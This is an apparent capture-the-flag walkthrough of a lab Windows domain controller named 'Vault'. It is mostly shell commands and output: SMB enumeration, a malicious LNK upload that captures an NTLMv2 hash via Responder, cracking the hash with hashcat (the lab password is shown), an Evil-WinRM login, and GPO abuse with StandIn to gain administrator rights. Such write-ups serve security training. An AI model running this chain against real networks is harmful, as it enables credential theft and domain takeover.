```
nmap -sC -sV -Pn -oA vault 192.168.55.172                          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-24 16:30 CST
Nmap scan report for 192.168.55.172
Host is up (0.047s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-24 22:30:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-02-24T22:31:19+00:00; +13s from scanner time.
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2023-02-23T22:16:01
|_Not valid after:  2023-08-25T22:16:01
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2023-02-24T22:30:31+00:00
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 9s, deviation: 2s, median: 7s
| smb2-time: 
|   date: 2023-02-24T22:30:35
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.96 seconds

```

Started off by checking smb to see if we have open shares.

```sh
smbclient -L \\\\192.168.55.172\\          
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DocumentsShare  Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.55.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```
Lets check out this share

```sh
smbclient \\\\192.168.55.172\\DocumentsShare
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Nov 19 02:59:02 2021
  ..                                  D        0  Fri Nov 19 02:59:02 2021

                7706623 blocks of size 4096. 1093587 blocks available
```

It's empty.

After some looking and testing, we can upload files here. We could use this to create a malicious lnk file to get a hash using responder.

https://infinitelogins.com/2020/12/17/capturing-password-hashes-via-malicious-lnk-files/

Created lnk using Powershell.

```sh
smb: \> put photo.lnk
putting file photo.lnk as \photo.lnk (7.4 kb/s) (average 7.4 kb/s)
smb: \> 
```

```shell
sudo responder -I tun0 -dwFP -v
[sudo] password for kali: 
Sorry, try again.
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [ON]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [192.168.49.55]
    Responder IPv6             [fe80::cc02:2b0c:8327:725d]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-XRPNJ1HM1RF]
    Responder Domain Name      [0VKF.LOCAL]
    Responder DCE-RPC Port     [46631]

[+] Listening for events...                                                                                         

[SMB] NTLMv2-SSP Client   : 192.168.55.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:6c15a3cd9d7bb779:0A00C8749C99C386C57A1083823A4C0E:01010000000000000054124A7C48D9015806F1775C42E4440000000002000800300056004B00460001001E00570049004E002D005800520050004E004A00310048004D0031005200460004003400570049004E002D005800520050004E004A00310048004D003100520046002E00300056004B0046002E004C004F00430041004C0003001400300056004B0046002E004C004F00430041004C0005001400300056004B0046002E004C004F00430041004C00070008000054124A7C48D90106000400020000000800300030000000000000000100000000200000F98293C1B0FA7DF1BB4D2AA922744F608ABEA5BFB1464793B2309758298428F00A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00340039002E00350035000000000000000000
```
Cracking the hash.
```sh
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```
Found the password.
`ANIRUDH:SecureHM`

Password was cracked lets see what we can do.

Winrm works becasue the port is open to us so we can login and use that.

After some looking around, it appears that we have access to the backup and restore function that we could use for priv esc.
https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960

I wanted to check GPO as nothing else was of interest and found that it would be easy to do.

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#abuse-gpo-with-standin
```sh
*Evil-WinRM* PS C:\temp> upload /home/kali/OPG/Vault/StandIn_v13_Net45.exe C:\temp\standin.exe
Info: Uploading /home/kali/OPG/Vault/StandIn_v13_Net45.exe to C:\temp\standin.exe

                                                             
Data: 219136 bytes of 219136 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\temp> dir


    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/24/2023   8:34 PM         164352 standin.exe


*Evil-WinRM* PS C:\temp> .\standin.exe --gpo

[?] Using DC : DC.vault.offsec
[+] GPO result count         : 2
    |_ Result limit          : 50

[?] Object   : CN={6AC1786C-016F-11D2-945F-00C04fB984F9}
    Path     : LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=vault,DC=offsec
    DisplayName              : Default Domain Controllers Policy
    CN                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}
    GPCFilesysPath           : \\vault.offsec\sysvol\vault.offsec\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
    GPCMachineExtensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
    WhenCreated              : 11/19/2021 8:50:33 AM
    WhenChanged              : 11/19/2021 8:50:33 AM

[?] Object   : CN={31B2F340-016D-11D2-945F-00C04FB984F9}
    Path     : LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vault,DC=offsec
    DisplayName              : Default Domain Policy
    CN                       : {31B2F340-016D-11D2-945F-00C04FB984F9}
    GPCFilesysPath           : \\vault.offsec\sysvol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
    GPCMachineExtensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
    WhenCreated              : 11/19/2021 8:50:33 AM
    WhenChanged              : 11/19/2021 9:00:32 AM
```
Looks like we have access to check GPO policies. Let's check permissions on the default domain policy.
```sh
Evil-WinRM* PS C:\temp> .\standin.exe --gpo --filter "Default Domain Policy" --acl

[?] Using DC : DC.vault.offsec
[+] GPO result count         : 1
    |_ Result limit          : 50
    |_ Applying search filter

[?] Object   : CN={31B2F340-016D-11D2-945F-00C04FB984F9}
    Path     : LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vault,DC=offsec
    GPCFilesysPath : \\vault.offsec\sysvol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
    Path           : OK

[+] Account       : CREATOR OWNER
    Type          : Allow
    Rights        : FullControl
    Inherited ACE : False
    Propagation   : InheritOnly

[+] Account       : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
    Type          : Allow
    Rights        : ReadAndExecute, Synchronize
    Inherited ACE : False
    Propagation   : None

[+] Account       : NT AUTHORITY\Authenticated Users
    Type          : Allow
    Rights        : ReadAndExecute, Synchronize
    Inherited ACE : False
    Propagation   : None

[+] Account       : NT AUTHORITY\SYSTEM
    Type          : Allow
    Rights        : FullControl
    Inherited ACE : False
    Propagation   : None

[+] Account       : VAULT\Domain Admins
    Type          : Allow
    Rights        : FullControl
    Inherited ACE : False
    Propagation   : InheritOnly

[+] Account       : VAULT\Domain Admins
    Type          : Allow
    Rights        : Write, ReadAndExecute, ChangePermissions, TakeOwnership, Synchronize
    Inherited ACE : False
    Propagation   : None

[+] Account       : VAULT\Enterprise Admins
    Type          : Allow
    Rights        : FullControl
    Inherited ACE : False
    Propagation   : InheritOnly

[+] Account       : VAULT\Enterprise Admins
    Type          : Allow
    Rights        : Write, ReadAndExecute, ChangePermissions, TakeOwnership, Synchronize
    Inherited ACE : False
    Propagation   : None

[+] Account       : VAULT\anirudh
    Type          : Allow
    Rights        : FullControl
    Inherited ACE : False
    Propagation   : None
```
We have full control with the user we have. Lets grant him administrator.
```sh
*Evil-WinRM* PS C:\temp> .\standin.exe --gpo --filter "Default Domain Policy" --localadmin anirudh

[?] Using DC : DC.vault.offsec

[+] GPO Object Found
    Object   : CN={31B2F340-016D-11D2-945F-00C04FB984F9}
    Path     : LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vault,DC=offsec
    GP Path  : \\vault.offsec\sysvol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}

[+] User Object Found
    Object   : CN=Anirudh
    Path     : LDAP://CN=Anirudh,CN=Users,DC=vault,DC=offsec
    SID      : S-1-5-21-537427935-490066102-1511301751-1103

[?] GPO Version
    User     : 0
    Computer : 4

[+] Writing GPO changes
    |_ Updating existing GptTmpl.inf
       |_ Adding group membership
       |_ Updating revision
    |_ Updating gpt.inf
    |_ Updating AD object
       |_ Incrementing version number
       |_ Updating gPCMachineExtensionNames
```
We need to force an update to have permissions apply.
```sh
*Evil-WinRM* PS C:\temp> gpupdate /force
Updating policy...



Computer Policy update has completed successfully.

User Policy update has completed successfully.



*Evil-WinRM* PS C:\temp> whoami /all

USER INFORMATION
----------------

User Name     SID
============= ============================================
vault\anirudh S-1-5-21-537427935-490066102-1511301751-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\temp> exit

Info: Exiting with code 0
```
User role did not apply. Signing out and back in.
```
┌──(kali㉿kali)-[~/OPG/Vault]
└─$ evil-winrm -i 192.168.55.172 -u anirudh -p SecureHM

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\anirudh\Documents> whoami /all

USER INFORMATION
----------------

User Name     SID
============= ============================================
vault\anirudh S-1-5-21-537427935-490066102-1511301751-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\anirudh\Documents> cd ..
*Evil-WinRM* PS C:\Users\anirudh> cd ..
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/28/2021   3:53 AM                Administrator
d-----       11/19/2021   1:12 AM                anirudh
d-r---        5/28/2021   3:53 AM                Public


*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       11/19/2021  12:04 AM                3D Objects
d-r---       11/19/2021  12:04 AM                Contacts
d-r---       11/19/2021   1:10 AM                Desktop
d-r---       11/19/2021  12:04 AM                Documents
d-r---       11/19/2021  12:04 AM                Downloads
d-r---       11/19/2021  12:04 AM                Favorites
d-r---       11/19/2021  12:04 AM                Links
d-r---       11/19/2021  12:04 AM                Music
d-r---       11/19/2021  12:04 AM                Pictures
d-r---       11/19/2021  12:04 AM                Saved Games
d-r---       11/19/2021  12:04 AM                Searches
d-r---       11/19/2021  12:04 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> more proof.txt
```
And we have the proof.